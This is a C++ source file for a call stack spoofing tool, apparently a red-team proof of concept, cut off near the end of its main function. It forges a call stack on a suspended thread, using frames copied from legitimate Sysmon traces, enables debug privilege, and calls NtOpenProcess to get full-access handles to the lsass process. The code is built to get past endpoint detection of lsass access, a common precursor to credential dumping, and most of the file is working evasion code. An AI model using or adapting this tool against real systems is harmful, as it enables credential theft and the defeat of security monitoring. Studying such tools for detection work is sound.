#include <algorithm>
#include <ehdata.h>
#include <iostream>
#include <map>
#include <subauth.h>
#include <TlHelp32.h>
#include <vector>
#include <Windows.h>

//
// From Ntdef.h.
//
// Treat anything not STATUS_SUCCESS as an error.
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) == 0)
#define STATUS_SUCCESS   ((NTSTATUS)0x00000000L)

#define MAX_STACK_SIZE 10000
#define RBP_OP_INFO 0x5

//
// Definitions and structs required to call NtOpenProcess.
//
#define InitializeObjectAttributes( p, n, a, r, s ) { \
    (p)->Length = sizeof( OBJECT_ATTRIBUTES );          \
    (p)->RootDirectory = r;                             \
    (p)->Attributes = a;                                \
    (p)->ObjectName = n;                                \
    (p)->SecurityDescriptor = s;                        \
    (p)->SecurityQualityOfService = NULL;               \
    }

typedef struct _CLIENT_ID {
    HANDLE UniqueProcess;
    HANDLE UniqueThread;
} CLIENT_ID, * PCLIENT_ID;
CLIENT_ID clientTest = {};

typedef struct _OBJECT_ATTRIBUTES {
    ULONG           Length;
    HANDLE          RootDirectory;
    PUNICODE_STRING ObjectName;
    ULONG           Attributes;
    PVOID           SecurityDescriptor;
    PVOID           SecurityQualityOfService;
} OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;

//
// Unwind op codes: https://docs.microsoft.com/en-us/cpp/build/exception-handling-x64?view=msvc-170
//
typedef enum _UNWIND_OP_CODES {
    UWOP_PUSH_NONVOL = 0, /* info == register number */
    UWOP_ALLOC_LARGE,     /* no info, alloc size in next 2 slots */
    UWOP_ALLOC_SMALL,     /* info == size of allocation / 8 - 1 */
    UWOP_SET_FPREG,       /* no info, FP = RSP + UNWIND_INFO.FPRegOffset*16 */
    UWOP_SAVE_NONVOL,     /* info == register number, offset in next slot */
    UWOP_SAVE_NONVOL_FAR, /* info == register number, offset in next 2 slots */
    UWOP_SAVE_XMM128 = 8, /* info == XMM reg number, offset in next slot */
    UWOP_SAVE_XMM128_FAR, /* info == XMM reg number, offset in next 2 slots */
    UWOP_PUSH_MACHFRAME   /* info == 0: no error-code, 1: error-code */
} UNWIND_CODE_OPS;

//
// A lookup map for modules and their corresponding image base.
//
std::map<std::wstring, HMODULE> imageBaseMap;

//
// Used to store information for individual stack frames for call stack to spoof.
//
struct StackFrame {
    std::wstring targetDll;
    ULONG offset;
    ULONG totalStackSize;
    BOOL requiresLoadLibrary;
    BOOL setsFramePointer;
    PVOID returnAddress;
    BOOL pushRbp;
    ULONG countOfCodes;
    BOOL pushRbpIndex;

    StackFrame(std::wstring dllPath, ULONG targetOffset, ULONG targetStackSize, bool bDllLoad) :
        targetDll(dllPath),
        offset(targetOffset),
        totalStackSize(targetStackSize),
        requiresLoadLibrary(bDllLoad),
        setsFramePointer(false),
        returnAddress(0),
        pushRbp(false),
        countOfCodes(0),
        pushRbpIndex(0)
    {
    };
};

//
// Example call stacks (pulled from SysMon Event 10: process accessed where lsass is the target).
//
// As a word of caution, the call stacks below were
// generated via SysMon (and tested) on:
// * 10.0.19044.1706 (21h2)
// They have *not* been tested on any other Windows version and
// offsets may obviously vary on different Windows builds.
//

// CallTrace:
// C:\Windows\SYSTEM32\ntdll.dll + 9d204
// C:\Windows\System32\KERNELBASE.dll + 2c13e
// C:\Windows\Microsoft.NET\Framework64\v4.0.30319\CorperfmonExt.dll + c669
// C:\Windows\Microsoft.NET\Framework64\v4.0.30319\CorperfmonExt.dll + c71b
// C:\Windows\Microsoft.NET\Framework64\v4.0.30319\CorperfmonExt.dll + 2fde
// C:\Windows\Microsoft.NET\Framework64\v4.0.30319\CorperfmonExt.dll + 2b9e
// C:\Windows\Microsoft.NET\Framework64\v4.0.30319\CorperfmonExt.dll + 2659
// C:\Windows\Microsoft.NET\Framework64\v4.0.30319\CorperfmonExt.dll + 11b6
// C:\Windows\Microsoft.NET\Framework64\v4.0.30319\CorperfmonExt.dll + c144
// C:\Windows\System32\KERNEL32.DLL + 17034
// C:\Windows\SYSTEM32\ntdll.dll + 52651
std::vector<StackFrame> wmiCallstack =
{
    StackFrame(L"C:\\Windows\\SYSTEM32\\ntdll.dll", 0x9d204, 0, FALSE),
    StackFrame(L"C:\\Windows\\SYSTEM32\\kernelbase.dll", 0x2c13e, 0, FALSE),
    StackFrame(L"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\CorperfmonExt.dll", 0xc669, 0, TRUE),
    StackFrame(L"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\CorperfmonExt.dll", 0xc71b, 0, FALSE),
    StackFrame(L"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\CorperfmonExt.dll", 0x2fde, 0, FALSE),
    StackFrame(L"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\CorperfmonExt.dll", 0x2b9e, 0, FALSE),
    StackFrame(L"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\CorperfmonExt.dll", 0x2659, 0, FALSE),
    StackFrame(L"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\CorperfmonExt.dll", 0x11b6, 0, FALSE),
    StackFrame(L"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\CorperfmonExt.dll", 0xc144, 0, FALSE),
    StackFrame(L"C:\\Windows\\SYSTEM32\\kernel32.dll", 0x17034, 0, FALSE),
    StackFrame(L"C:\\Windows\\SYSTEM32\\ntdll.dll", 0x52651, 0, FALSE),
};

// CallTrace:
// C:\Windows\SYSTEM32\ntdll.dll + 9d204
// C:\Windows\System32\KERNELBASE.dll + 2c13e
// C:\Windows\system32\sysmain.dll + 80e5f
// C:\Windows\system32\sysmain.dll + 60ce6
// C:\Windows\system32\sysmain.dll + 2a7d3
// C:\Windows\system32\sysmain.dll + 2a331
// C:\Windows\system32\sysmain.dll + 66cf1
// C:\Windows\system32\sysmain.dll + 7b59e
// C:\windows\system32\sysmain.dll + 67ecf
// C:\Windows\system32\svchost.exe + 4300
// C:\Windows\System32\sechost.dll + df78
// C:\Windows\System32\KERNEL32.DLL + 17034
// C:\Windows\SYSTEM32\ntdll.dll + 52651
// NB Don't include first frame as this will automatically
// be recorded by the syscall to NtOpenProcess
std::vector<StackFrame> svchostCallstack =
{
    StackFrame(L"C:\\Windows\\SYSTEM32\\kernelbase.dll", 0x2c13e, 0, FALSE),
    StackFrame(L"C:\\Windows\\system32\\sysmain.dll", 0x80e5f, 0, TRUE),
    StackFrame(L"C:\\Windows\\system32\\sysmain.dll", 0x60ce6, 0, FALSE),
    StackFrame(L"C:\\Windows\\system32\\sysmain.dll", 0x2a7d3, 0, FALSE),
    StackFrame(L"C:\\Windows\\system32\\sysmain.dll", 0x2a331, 0, FALSE),
    StackFrame(L"C:\\Windows\\system32\\sysmain.dll", 0x66cf1, 0, FALSE),
    StackFrame(L"C:\\Windows\\system32\\sysmain.dll", 0x7b59e, 0, FALSE),
    StackFrame(L"C:\\Windows\\system32\\sysmain.dll", 0x67ecf, 0, FALSE),
    StackFrame(L"C:\\Windows\\SYSTEM32\\svchost.exe", 0x4300, 0, TRUE),
    StackFrame(L"C:\\Windows\\SYSTEM32\\sechost.dll", 0xdf78, 0, FALSE),
    StackFrame(L"C:\\Windows\\SYSTEM32\\kernel32.dll", 0x17034, 0, FALSE),
    StackFrame(L"C:\\Windows\\SYSTEM32\\ntdll.dll", 0x52651, 0, FALSE),
};

// CallTrace:
// C:\Windows\SYSTEM32\ntdll.dll + 9d204
// C:\Windows\System32\KERNELBASE.dll + 32ea6
// C:\Windows\System32\lsm.dll + e959
// C:\Windows\System32\RPCRT4.dll + 79633
// C:\Windows\System32\RPCRT4.dll + 13711
// C:\Windows\System32\RPCRT4.dll + dd77b
// C:\Windows\System32\RPCRT4.dll + 5d2ac
// C:\Windows\System32\RPCRT4.dll + 5a408
// C:\Windows\System32\RPCRT4.dll + 3a266
// C:\Windows\System32\RPCRT4.dll + 39bb8
// C:\Windows\System32\RPCRT4.dll + 48a0f
// C:\Windows\System32\RPCRT4.dll + 47e18
// C:\Windows\System32\RPCRT4.dll + 47401
// C:\Windows\System32\RPCRT4.dll + 46e6e
// C:\Windows\System32\RPCRT4.dll + 4b542
// C:\Windows\SYSTEM32\ntdll.dll + 20330
// C:\Windows\SYSTEM32\ntdll.dll + 52f26
// C:\Windows\System32\KERNEL32.DLL + 17034
// C:\Windows\SYSTEM32\ntdll.dll + 52651
std::vector<StackFrame> rpcCallstack =
{
    StackFrame(L"C:\\Windows\\SYSTEM32\\kernelbase.dll", 0x32ea6, 0, FALSE),
    StackFrame(L"C:\\Windows\\SYSTEM32\\lsm.dll", 0xe959, 0, TRUE),
    StackFrame(L"C:\\Windows\\SYSTEM32\\RPCRT4.dll", 0x79633, 0, TRUE),
    StackFrame(L"C:\\Windows\\SYSTEM32\\RPCRT4.dll", 0x13711, 0, TRUE),
    StackFrame(L"C:\\Windows\\SYSTEM32\\RPCRT4.dll", 0xdd77b, 0, FALSE),
    StackFrame(L"C:\\Windows\\SYSTEM32\\RPCRT4.dll", 0x5d2ac, 0, FALSE),
    StackFrame(L"C:\\Windows\\SYSTEM32\\RPCRT4.dll", 0x5a408, 0, FALSE),
    StackFrame(L"C:\\Windows\\SYSTEM32\\RPCRT4.dll", 0x3a266, 0, FALSE),
    StackFrame(L"C:\\Windows\\SYSTEM32\\RPCRT4.dll", 0x39bb8, 0, FALSE),
    StackFrame(L"C:\\Windows\\SYSTEM32\\RPCRT4.dll", 0x48a0f, 0, FALSE),
    StackFrame(L"C:\\Windows\\SYSTEM32\\RPCRT4.dll", 0x47e18, 0, FALSE),
    StackFrame(L"C:\\Windows\\SYSTEM32\\RPCRT4.dll", 0x47401, 0, FALSE),
    StackFrame(L"C:\\Windows\\SYSTEM32\\RPCRT4.dll", 0x46e6e, 0, FALSE),
    StackFrame(L"C:\\Windows\\SYSTEM32\\RPCRT4.dll", 0x4b542, 0, FALSE),
    StackFrame(L"C:\\Windows\\SYSTEM32\\ntdll.dll", 0x20330, 0, FALSE),
    StackFrame(L"C:\\Windows\\SYSTEM32\\ntdll.dll", 0x52f26, 0, FALSE),
    StackFrame(L"C:\\Windows\\SYSTEM32\\kernel32.dll", 0x17034, 0, FALSE),
    StackFrame(L"C:\\Windows\\SYSTEM32\\ntdll.dll", 0x52651, 0, FALSE),
};

//
// Calculates the image base for the given stack frame
// and adds it to the image base map.
//
NTSTATUS GetImageBase(StackFrame &stackFrame)
{
    NTSTATUS status = STATUS_SUCCESS;
    HMODULE tmpImageBase = 0;

    // [0] Check if image base has already been resolved.
    if (imageBaseMap.count(stackFrame.targetDll))
    {
        goto Cleanup;
    }

    // [1] Check if current frame contains a
    // non standard dll and load if so.
    if (stackFrame.requiresLoadLibrary)
    {
        tmpImageBase = LoadLibrary(stackFrame.targetDll.c_str());
        if (!tmpImageBase)
        {
            status = STATUS_DLL_NOT_FOUND;
            goto Cleanup;
        }
    }

    // [2] If we haven't already recorded the
    // image base capture it now.
    if (!tmpImageBase)
    {
        tmpImageBase = GetModuleHandle(stackFrame.targetDll.c_str());
        if (!tmpImageBase)
        {
            status = STATUS_DLL_NOT_FOUND;
            goto Cleanup;
        }
    }

    // [3] Add to image base map to avoid superfluous recalculating.
    imageBaseMap.insert({ stackFrame.targetDll, tmpImageBase });

Cleanup:
    return status;
}

//
// Uses the offset within the stackframe structure to
// calculate the return address for fake frame.
//
NTSTATUS CalculateReturnAddress(StackFrame &stackFrame)
{
    NTSTATUS status = STATUS_SUCCESS;

    try {
    const PVOID targetImageBaseAddress = imageBaseMap.at(stackFrame.targetDll);
    if (!targetImageBaseAddress) {
            status = STATUS_DLL_NOT_FOUND;
            goto Cleanup;
     }
        stackFrame.returnAddress = (PCHAR)targetImageBaseAddress + stackFrame.offset;
    }
    catch (const std::out_of_range&)
    {
        std::cout << "Dll \"" << stackFrame.targetDll.c_str() << "\" not found" << std::endl;
        status = STATUS_DLL_NOT_FOUND;
        goto Cleanup;
    }

Cleanup:
    return status;
}

//
// Calculates the total stack space used by the fake stack frame. Uses
// a minimal implementation of RtlUnwind to parse the unwind codes for
// target function and add up total stack size. Largely based on:
// https://github.com/hzqst/unicorn_pe/blob/master/unicorn_pe/except.cpp#L773
//
NTSTATUS CalculateFunctionStackSize(PRUNTIME_FUNCTION pRuntimeFunction, DWORD64 ImageBase, StackFrame &stackFrame)
{
    NTSTATUS status = STATUS_SUCCESS;
    PUNWIND_INFO pUnwindInfo = NULL;
    ULONG unwindOperation = 0;
    ULONG operationInfo = 0;
    ULONG index = 0;
    ULONG frameOffset = 0;

    // [0] Sanity check incoming pointer.
    if (!pRuntimeFunction)
    {
        status = STATUS_INVALID_PARAMETER;
        goto Cleanup;
    }

    // [1] Loop over unwind info.
    pUnwindInfo = (PUNWIND_INFO)(pRuntimeFunction->UnwindData + ImageBase);
    while (index < pUnwindInfo->CountOfCodes)
    {
        unwindOperation = pUnwindInfo->UnwindCode[index].UnwindOp;
        operationInfo = pUnwindInfo->UnwindCode[index].OpInfo;
        // [2] Loop over unwind codes and calculate
        // total stack space used by target function.
        switch (unwindOperation) {
        case UWOP_PUSH_NONVOL:
            // UWOP_PUSH_NONVOL is 8 bytes.
            stackFrame.totalStackSize += 8;
            // Record if it pushes rbp as
            // this is important for UWOP_SET_FPREG.
            if (RBP_OP_INFO == operationInfo)
            {
                stackFrame.pushRbp = true;
                // Record when rbp is pushed to stack.
                stackFrame.countOfCodes = pUnwindInfo->CountOfCodes;
                stackFrame.pushRbpIndex = index + 1;
            }
            break;
        case UWOP_SAVE_NONVOL:
            //UWOP_SAVE_NONVOL doesn't contribute to stack size
            // but you do need to increment index.
            index += 1;
            break;
        case UWOP_ALLOC_SMALL:
            //Alloc size is op info field * 8 + 8.
            stackFrame.totalStackSize += ((operationInfo * 8) + 8);
            break;
        case UWOP_ALLOC_LARGE:
            // Alloc large is either:
            // 1) If op info == 0 then size of alloc / 8
            // is in the next slot (i.e. index += 1).
            // 2) If op info == 1 then size is in next
            // two slots.
            index += 1;
            frameOffset = pUnwindInfo->UnwindCode[index].FrameOffset;
            if (operationInfo == 0)
            {
                frameOffset *= 8;
            }
            else
            {
                index += 1;
                frameOffset += (pUnwindInfo->UnwindCode[index].FrameOffset << 16);
            }
            stackFrame.totalStackSize += frameOffset;
            break;
        case UWOP_SET_FPREG:
            // This sets rsp == rbp (mov rsp,rbp), so we need to ensure
            // that rbp is the expected value (in the frame above) when
            // it comes to spoof this frame in order to ensure the
            // call stack is correctly unwound.
            stackFrame.setsFramePointer = true;
            break;
        default:
            std::cout << "[-] Error: Unsupported Unwind Op Code\n";
            status = STATUS_ASSERTION_FAILURE;
            break;
        }

        index += 1;
    }

    // If chained unwind information is present then we need to
    // also recursively parse this and add to total stack size.
    if (0 != (pUnwindInfo->Flags & UNW_FLAG_CHAININFO))
    {
        index = pUnwindInfo->CountOfCodes;
        if (0 != (index & 1))
        {
            index += 1;
        }
        pRuntimeFunction = (PRUNTIME_FUNCTION)(&pUnwindInfo->UnwindCode[index]);
        return CalculateFunctionStackSize(pRuntimeFunction, ImageBase, stackFrame);
    }

    // Add the size of the return address (8 bytes).
    stackFrame.totalStackSize += 8;

Cleanup:
    return status;
}

//
// Retrieves the runtime function entry for given fake ret address
// and calls CalculateFunctionStackSize, which will recursively
// calculate the total stack space utilisation.
//
NTSTATUS CalculateFunctionStackSizeWrapper(StackFrame &stackFrame)
{
    NTSTATUS status = STATUS_SUCCESS;
    PRUNTIME_FUNCTION pRuntimeFunction = NULL;
    DWORD64 ImageBase = 0;
    PUNWIND_HISTORY_TABLE pHistoryTable = NULL;

    // [0] Sanity check return address.
    if (!stackFrame.returnAddress)
    {
        status = STATUS_INVALID_PARAMETER;
        goto Cleanup;
    }

    // [1] Locate RUNTIME_FUNCTION for given function.
    pRuntimeFunction = RtlLookupFunctionEntry(
        (DWORD64)stackFrame.returnAddress,
        &ImageBase,
        pHistoryTable);
    if (NULL == pRuntimeFunction)
    {
        status = STATUS_ASSERTION_FAILURE;
        goto Cleanup;
    }

    // [2] Recursively calculate the total stack size for
    // the function we are "returning" to.
    status = CalculateFunctionStackSize(pRuntimeFunction, ImageBase, stackFrame);

Cleanup:
    return status;
}

//
// Takes a target call stack and configures it ready for use
// via loading any required dlls, resolving module addresses
// and calculating spoofed return addresses.
//
NTSTATUS InitialiseSpoofedCallstack(std::vector<StackFrame> &targetCallstack)
{
    NTSTATUS status = STATUS_SUCCESS;

    for (auto stackFrame = targetCallstack.begin(); stackFrame != targetCallstack.end(); stackFrame++)
    {
        // [1] Get image base for current stack frame
        status = GetImageBase(*stackFrame);
        if (!NT_SUCCESS(status))
        {
            std::cout << "[-] Error: Failed to get image base\n";
            goto Cleanup;
        }

        // [2] Calculate ret address for current stack frame
        status = CalculateReturnAddress(*stackFrame);
        if (!NT_SUCCESS(status))
        {
            std::cout << "[-] Error: Failed to caluclate ret address\n";
            goto Cleanup;
        }

        // [3] Calculate the total stack size for ret function
        status = CalculateFunctionStackSizeWrapper(*stackFrame);
        if (!NT_SUCCESS(status))
        {
            std::cout << "[-] Error: Failed to caluclate total stack size\n";
            goto Cleanup;
        }
    }

Cleanup:
    return status;
}

//
// Pushes a value to the stack of a Context structure.
//
void PushToStack(CONTEXT &Context, ULONG64 value)
{
    Context.Rsp -= 0x8;
    PULONG64 AddressToWrite = (PULONG64)(Context.Rsp);
    *AddressToWrite = value;
}

//
// Initialises the spoofed thread state before it begins
// to execute by building a fake call stack via modifying
// rsp and appropriate stack data.
//
void InitialiseFakeThreadState(CONTEXT& context, std::vector<StackFrame> &targetCallstack)
{
    ULONG64 childSp = 0;
    BOOL bPreviousFrameSetUWOP_SET_FPREG = false;

    // [1] As an extra sanity check explicitly clear
    // the last RET address to stop any further unwinding.
    PushToStack(context, 0);

    // [2] Loop through target call stack *backwards*
    // and modify the stack so it resembles the fake
    // call stack e.g. essentially making the top of
    // the fake stack look like the diagram below:
    //      |                |
    //       ----------------
    //      |  RET ADDRESS   |
    //       ----------------
    //      |                |
    //      |     Unwind     |
    //      |     Stack      |
    //      |      Size      |
    //      |                |
    //       ----------------
    //      |  RET ADDRESS   |
    //       ----------------
    //      |                |
    //      |     Unwind     |
    //      |     Stack      |
    //      |      Size      |
    //      |                |
    //       ----------------
    //      |   RET ADDRESS  |
    //       ----------------   <--- RSP when NtOpenProcess is called
    //
    for (auto stackFrame = targetCallstack.rbegin(); stackFrame != targetCallstack.rend(); ++stackFrame)
    {
        // [2.1] Check if the last frame set UWOP_SET_FPREG.
        // If the previous frame uses the UWOP_SET_FPREG
        // op, it will reset the stack pointer to rbp.
        // Therefore, we need to find the next function in
        // the chain which pops rbp and make sure it writes
        // the correct value to the stack (push rbp) so it is
        // propagated to the frame after that needs it (otherwise
        // stackwalk will fail). The required value is the childSP
        // of the function that used UWOP_SET_FPREG (i.e. the
        // value of RSP after it is done adjusting the stack and
        // before it pushes its RET address).
        if (bPreviousFrameSetUWOP_SET_FPREG && stackFrame->pushRbp)
        {
            // [2.2] Check when RBP was pushed to the stack in function
            // prologue. UWOP_PUSH_NONVOls will always be last:
            // "Because of the constraints on epilogs, UWOP_PUSH_NONVOL
            // unwind codes must appear first in the prolog and
            // correspondingly, last in the unwind code array."
            // Hence, subtract the push rbp code index from the
            // total count to work out when it is pushed onto stack.
            // E.g. diff will be 1 below, so rsp -= 0x8 then write childSP:
            // RPCRT4!LrpcIoComplete:
            // 00007ffd`b342b480 4053            push    rbx
            // 00007ffd`b342b482 55              push    rbp
            // 00007ffd`b342b483 56              push    rsi
            // If diff == 0, rbp is pushed first etc.
            auto diff = stackFrame->countOfCodes - stackFrame->pushRbpIndex;
            auto tmpStackSizeCounter = 0;
            for (ULONG i = 0; i < diff; i++)
            {
                PushToStack(context, 0x0);
                tmpStackSizeCounter += 0x8;
            }
            PushToStack(context, childSp);

            // [2.3] Minus off the remaining function stack size
            // and continue unwinding.
            context.Rsp -= (stackFrame->totalStackSize - (tmpStackSizeCounter + 0x8));
            PULONG64 fakeRetAddress = (PULONG64)(context.Rsp);
            *fakeRetAddress = (ULONG64)stackFrame->returnAddress;

            // [2.4] From my testing it seems you only need to get rbp
            // right for the next available frame in the chain which pushes it.
            // Hence, there can be a frame in between which does not modify rbp.
            // Ergo set this to false once you have resolved rbp for frame
            // which needed it. This is pretty flimsy though so this assumption
            // may break for other more complicated examples.
            bPreviousFrameSetUWOP_SET_FPREG = false;
        }
        else
        {
            // [3] If normal frame, decrement total stack size
            // and write RET address
            context.Rsp -= stackFrame->totalStackSize;
            PULONG64 fakeRetAddress = (PULONG64)(context.Rsp);
            *fakeRetAddress = (ULONG64)stackFrame->returnAddress;
        }

        // [4] Check if the current function sets frame pointer
        // when unwinding e.g. mov rsp,rbp / UWOP_SET_FPREG
        // and record its childSP.
        if (stackFrame->setsFramePointer)
        {
            childSp = context.Rsp;
            childSp += 0x8;
            bPreviousFrameSetUWOP_SET_FPREG = true;
        }
    }
}

//
// Retrieves the pid of the lsass process.
//
NTSTATUS GetLsassPid(DWORD &pid)
{
    NTSTATUS status = STATUS_SUCCESS;
    PROCESSENTRY32 processEntry = { sizeof(PROCESSENTRY32) };
    THREADENTRY32 threadEntry = { sizeof(THREADENTRY32) };
    std::vector<DWORD> threadIds;

    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS | TH32CS_SNAPTHREAD, 0);
    if (INVALID_HANDLE_VALUE == snapshot)
    {
        status = STATUS_ASSERTION_FAILURE;
        goto Cleanup;
    }

    if (Process32First(snapshot, &processEntry))
    {
        while (_wcsicmp(processEntry.szExeFile, L"lsass.exe") != 0)
        {
            Process32Next(snapshot, &processEntry);
        }
    }
    pid = processEntry.th32ProcessID;

Cleanup:
    return status;
}

//
// Sets the specified privilege in the current process access token.
// Based on:
// https://docs.microsoft.com/en-us/windows/win32/secauthz/enabling-and-disabling-privileges-in-c--
//
BOOL SetPrivilege(
    LPCTSTR lpszPrivilege,
    BOOL bEnablePrivilege
)
{
    TOKEN_PRIVILEGES tp = {};
    LUID luid = {};
    HANDLE hToken = NULL;

    // [1] Obtain handle to process token
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
    {
        std::cout << "[-] Failed to OpenProcessToken \n";
        return FALSE;
    }

    // [2] Look up supplied privilege value and set if required
    if (!LookupPrivilegeValue(NULL, lpszPrivilege, &luid))
    {
        std::cout << "[-] SetPrivilege failed: LookupPrivilegeValue error" << GetLastError() << std::endl;
        return FALSE;
    }
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    if (bEnablePrivilege)
    {
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    }
    else
    {
        tp.Privileges[0].Attributes = 0;
    }

    // [3] Enable the privilege or disable all privileges.
    if (!AdjustTokenPrivileges(
        hToken,
        FALSE,
        &tp,
        sizeof(TOKEN_PRIVILEGES),
        (PTOKEN_PRIVILEGES)NULL,
        (PDWORD)NULL))
    {
        std::cout << "[-] AdjustTokenPrivileges failed: LookupPrivilegeValue error" << GetLastError() << std::endl;
        return FALSE;
    }

    if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)
    {
        std::cout << "[-] SetPrivilege failed: LookupPrivilegeValue error\n";
        return FALSE;
    }

    return TRUE;
}

//
// Handles the inevitable crash of the fake thread and redirects
// it to gracefully exit via RtlExitUserThread.
//
LONG CALLBACK VehCallback(PEXCEPTION_POINTERS ExceptionInfo)
{
    ULONG exceptionCode = ExceptionInfo->ExceptionRecord->ExceptionCode;

    // [0] If unrelated to us, keep searching.
    if (exceptionCode != STATUS_ACCESS_VIOLATION) return EXCEPTION_CONTINUE_SEARCH;

    // [1] Handle access violation error by gracefully exiting thread.
    if (exceptionCode == STATUS_ACCESS_VIOLATION)
    {
        std::cout << "[+] VEH Exception Handler called \n";
        std::cout << "[+] Re-directing spoofed thread to RtlExitUserThread \n";
        ExceptionInfo->ContextRecord->Rip = (DWORD64)GetProcAddress(GetModuleHandleA("ntdll"), "RtlExitUserThread");
        ExceptionInfo->ContextRecord->Rcx = 0;
        return EXCEPTION_CONTINUE_EXECUTION;
    }
    return EXCEPTION_CONTINUE_EXECUTION;
}

//
// Dummy function used as start address for spoofed thread.
//
DWORD DummyFunction(LPVOID lpParam)
{
    std::cout << "[+] Hello from dummy function!\n";
    return 0;
}

NTSTATUS HandleArgs(int argc, char* argv[], std::vector<StackFrame> &targetCallstack)
{

    NTSTATUS status = STATUS_SUCCESS;

    if (argc < 2)
    {
        // No argument provided so just default to
        // spoofing svchost call stack.
        targetCallstack = svchostCallstack;
    }
    else
    {
        std::string callstackArg(argv[1]);
        if (callstackArg == "--wmi")
        {
            std::cout << "[+] Target call stack profile to spoof is wmi\n";
            targetCallstack = wmiCallstack;
        }
        else if (callstackArg == "--rpc")
        {
            std::cout << "[+] Target call stack profile to spoof is rpc\n";
            targetCallstack = rpcCallstack;
        }
        else if (callstackArg == "--svchost")
        {
            std::cout << "[+] Target call stack profile to spoof is svchost\n";
            targetCallstack = svchostCallstack;
        }
        else
        {
            std::cout << "[-] Error: Incorrect argument provided. The options are --wmi, --rpc, and --svchost.\n";
            status = ERROR_INVALID_PARAMETER;
        }
    }

    return status;
}

int main(int argc, char* argv[])
{
    std::cout << R"(
    
                             $$\                                                                                     
                             $$ |                                                                                    
        $$\    $$\ $$\   $$\ $$ | $$$$$$$\ $$$$$$\  $$$$$$$\         $$$$$$\  $$$$$$\ $$\    $$\  $$$$$$\  $$$$$$$\  
        \$$\  $$  |$$ |  $$ |$$ |$$  _____|\____$$\ $$  __$$\       $$  __$$\ \____$$\\$$\  $$  |$$  __$$\ $$  __$$\ 
         \$$\$$  / $$ |  $$ |$$ |$$ /      $$$$$$$ |$$ |  $$ |      $$ |  \__|$$$$$$$ |\$$\$$  / $$$$$$$$ |$$ |  $$ |
          \$$$  /  $$ |  $$ |$$ |$$ |     $$  __$$ |$$ |  $$ |      $$ |     $$  __$$ | \$$$  /  $$   ____|$$ |  $$ |
           \$  /   \$$$$$$  |$$ |\$$$$$$$\\$$$$$$$ |$$ |  $$ |      $$ |     \$$$$$$$ |  \$  /   \$$$$$$$\ $$ |  $$ |
            \_/     \______/ \__| \_______|\_______|\__|  \__|      \__|      \_______|   \_/     \_______|\__|  \__|
    
                                       Call Stack Spoofer            William Burgess @joehowwolf
    )" << '\n';

    NTSTATUS status = STATUS_SUCCESS;
    std::vector<StackFrame> targetCallstack = {};
    DWORD dwThreadId = 0;
    HANDLE hThread = 0;
    CONTEXT context = {};
    PVOID pHandler = NULL;
    BOOL ret = false;

    // Args for NtOpenProcess.
    OBJECT_ATTRIBUTES objectAttr;
    CLIENT_ID clientId;
    DWORD lsassPid = 0;
    HANDLE hLsass = 0;

    // [0] Handle command line args
    status = HandleArgs(argc, argv, targetCallstack);
    if (!NT_SUCCESS(status))
    {
        return -1;
    }

    // [1] Initialise our target call stack to spoof. This
    // will load any required dlls, calculate ret addresses,
    // and individual stack sizes needed to spoof the call stack
    std::cout << "[+] Initialising fake call stack...\n";
    status = InitialiseSpoofedCallstack(targetCallstack);
    if (!NT_SUCCESS(status))
    {
        std::cout << "[-] Failed to initialise fake call stack\n";
        return -1;
    }

    // [2] To grab a handle to lsass, new thread needs SeDebugPriv.
    if (!SetPrivilege(SE_DEBUG_NAME, true))
    {
        std::cout << "[-] Failed to enable SeDebugPrivilege; try re-running as admin \n";
        return -1;
    }

    // [3] Create suspended thread.
    // NB Stack can grow rapidly for spoofed call stack
    // so allow for plenty of space. Also start address
    // can be anything at this point.
    hThread = CreateThread(
        NULL,
        MAX_STACK_SIZE,
        DummyFunction,
        0,
        CREATE_SUSPENDED,
        &dwThreadId);
    if (!hThread)
    {
        std::cout << "[-] Failed to create suspended thread\n";
        return -1;
    }
    std::cout << "[+] Created suspended thread\n";

    // [4] Obtain context struct for suspended thread
    context.ContextFlags = CONTEXT_FULL;
    ret = GetThreadContext(hThread, &context);
    if (!ret)
    {
        std::cout << "[-] Failed to get thread context\n";
        return -1;
    }

    // [5.1] Initialise fake thread state
    std::cout << "[+] Initialising spoofed thread state...\n";
    InitialiseFakeThreadState(context, targetCallstack);

    // [5.2] Set arguments for NtOpenProcess
    // RCX
    context.Rcx = (DWORD64)&hLsass;
    // RDX
    context.Rdx = (DWORD64)PROCESS_ALL_ACCESS;
    // R8
    InitializeObjectAttributes(&objectAttr, NULL, 0, NULL, NULL);
    context.R8 = (DWORD64)&objectAttr;
    // R9
    GetLsassPid(lsassPid);
    clientId.UniqueProcess = (HANDLE)lsassPid;
    clientId.UniqueThread = 0;
    context.R9 = (DWORD64)&clientId;
    // RIP
    DWORD64 ntOpenProcessAddress = (DWORD64)GetProcAddress(GetModuleHandleA("ntdll"), "NtOpenProcess");
    context.Rip = ntOpenProcessAddress;

    // [5.3] Set thread context
    ret = SetThreadContext(hThread, &context);
    if (!ret)
    {
        std::cout << "[-] Failed to set thread context\n";
        return -1;
    }

    // [6] Register a vectored exception handler. Once the sys call has returned
    // the thread will error out, as it will traverse fake/non existent
    // call stack. This will catch the error and gracefully exit the thread.
    pHandler = AddVectoredExceptionHandler(1, (PVECTORED_EXCEPTION_HANDLER)VehCallback);
    if (!pHandler)
    {
        std::cout << "[-] Failed to add vectored exception handler\n";
        return -1;
    }

    // [7] Rock and or roll
    std::cout << "[+] Resuming suspended thread...\n";
    auto blah = ResumeThread(hThread);

    // [8] Sleep briefly
    std::cout << "[+] Sleeping for 5 seconds...\n";
    Sleep(5000);

    // [9] Did we get a handle to lsass?
    if (!hLsass)
    {
        std::cout << "[-] Error: Failed to obtain handle to lsass\n";
        return -1;
    }
    else
    {
        std::cout << "[+] Successfully obtained handle to lsass with spoofed callstack: " << hLsass << "\n";
